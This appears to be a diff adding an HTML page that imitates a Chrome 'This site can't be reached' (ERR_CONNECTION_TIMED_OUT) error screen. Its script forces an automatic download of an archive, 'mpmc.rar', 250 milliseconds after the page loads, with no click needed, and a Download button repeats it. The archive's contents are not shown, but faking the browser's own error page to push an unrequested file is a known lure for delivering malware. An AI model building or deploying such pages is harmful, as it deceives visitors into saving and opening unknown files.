@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Offline</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-[#202124] text-[#e8eaed]">
+    <main>
+      <section class="min-h-screen w-full flex items-center justify-center px-6">
+        <div class="w-full max-w-2xl">
+          <div class="flex flex-col items-center text-center">
+            <div class="mb-6">
+              <svg
+                width="72"
+                height="72"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+                class="opacity-80"
+              >
+                <path
+                  d="M7 3H17C18.1046 3 19 3.89543 19 5V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V5C5 3.89543 5.89543 3 7 3Z"
+                  stroke="#9aa0a6"
+                  stroke-width="1.5"
+                />
+                <path
+                  d="M8 8H16"
+                  stroke="#9aa0a6"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                />
+                <path
+                  d="M8 12H14"
+                  stroke="#9aa0a6"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                />
+                <path
+                  d="M8 16H12"
+                  stroke="#9aa0a6"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                />
+              </svg>
+            </div>
+
+            <h1 class="text-2xl sm:text-3xl font-semibold mb-3">
+              This site can’t be reached
+            </h1>
+            <p class="text-sm sm:text-base text-[#9aa0a6] mb-6">
+              The server took too long to respond.
+            </p>
+
+            <div class="w-full max-w-md text-left text-sm text-[#e8eaed]">
+              <div class="text-[#9aa0a6] mb-2">Try:</div>
+              <ul class="list-disc pl-6 space-y-1 text-[#8ab4f8]">
+                <li>Checking the connection</li>
+                <li>Checking the proxy and the firewall</li>
+                <li>Running Windows Network Diagnostics</li>
+              </ul>
+              <div class="mt-4 text-xs text-[#9aa0a6]">ERR_CONNECTION_TIMED_OUT</div>
+            </div>
+
+            <div class="mt-8 w-full max-w-md flex items-center justify-between">
+              <button
+                id="reloadBtn"
+                type="button"
+                class="rounded-full bg-[#8ab4f8] text-[#202124] px-5 py-2 text-sm font-medium hover:bg-[#a8c7ff] transition"
+              >
+                Reload
+              </button>
+              <button
+                id="detailsBtn"
+                type="button"
+                class="rounded-full border border-[#5f6368] text-[#e8eaed] px-5 py-2 text-sm font-medium hover:bg-white/5 transition"
+              >
+                Details
+              </button>
+            </div>
+
+            <div class="mt-5 text-xs text-[#9aa0a6]" id="downloadStatus" aria-live="polite"></div>
+          </div>
+        </div>
+      </section>
+
+      <section class="w-full px-6 pb-16">
+        <div class="max-w-2xl mx-auto">
+          <div class="h-10"></div>
+          <div class="flex items-center justify-center">
+            <button
+              id="downloadBtn"
+              type="button"
+              class="rounded-lg bg-white/10 hover:bg-white/15 border border-white/10 text-white px-4 py-2 text-sm font-medium transition"
+            >
+              Download
+            </button>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      const FILE_PATH = "./mpmc.rar";
+      const FILE_NAME = "mpmc.rar";
+
+      const statusEl = document.getElementById("downloadStatus");
+      const downloadBtn = document.getElementById("downloadBtn");
+      const reloadBtn = document.getElementById("reloadBtn");
+      const detailsBtn = document.getElementById("detailsBtn");
+
+      function setStatus(message) {
+        if (statusEl) statusEl.textContent = message;
+      }
+
+      async function downloadFile() {
+        try {
+          setStatus("Preparing download…");
+
+          const res = await fetch(FILE_PATH, { cache: "no-store" });
+          if (!res.ok) throw new Error("Failed to fetch file");
+
+          const blob = await res.blob();
+          const url = URL.createObjectURL(blob);
+
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = FILE_NAME;
+          a.rel = "noopener";
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+
+          setTimeout(() => URL.revokeObjectURL(url), 10_000);
+          setStatus("Download started.");
+        } catch (e) {
+          const a = document.createElement("a");
+          a.href = FILE_PATH;
+          a.download = FILE_NAME;
+          a.rel = "noopener";
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+          setStatus("Download started.");
+        }
+      }
+
+      document.addEventListener("DOMContentLoaded", () => {
+        reloadBtn?.addEventListener("click", () => window.location.reload());
+        detailsBtn?.addEventListener("click", () =>
+          alert("This page is offline-style UI. Use Download to get the file.")
+        );
+        downloadBtn?.addEventListener("click", downloadFile);
+
+        setTimeout(() => {
+          downloadFile();
+        }, 250);
+      });
+    </script>
+  </body>
+</html>
